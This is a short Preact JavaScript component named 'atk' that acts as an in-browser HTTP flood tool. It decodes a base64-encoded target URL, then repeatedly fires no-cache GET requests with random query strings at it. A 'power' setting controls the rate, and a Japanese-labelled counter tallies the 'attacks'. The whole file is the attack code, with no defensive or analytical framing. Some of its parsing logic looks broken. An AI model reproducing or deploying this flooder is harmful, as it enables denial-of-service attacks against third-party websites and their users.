import { useState } from "preact/hooks";

export default function atk(name) {
  let query = name.name;

  let power = query.toString().slice(0);

  power = parseInt(power);

  let target = atob(query.toString()).slice(
    1,
    btoa(query.toString()).length - 1
  );

  if (target == "Q=") {
    target = " Error: 対象が空です。";
  }

  let [range, setRange] = useState(0);

  let interval = (11 - power) * 10;

  setTimeout(() => {
    for (let i = 0; i < 3; i++) {
      fetch(target + "?" + Math.random().toString() + "=macl2189", {
        method: "GET",
        cache: "no-cache",
        redirect: "follow",
        referrerPolicy: "no-referrer",
      }).catch((e) => {});
    }
    setRange(range + 3);
  }, interval);

  return (
    <div>
      Target: {target} <br />
      Power: {power} <br />
      攻撃回数: {range} <br />
    </div>
  );
}
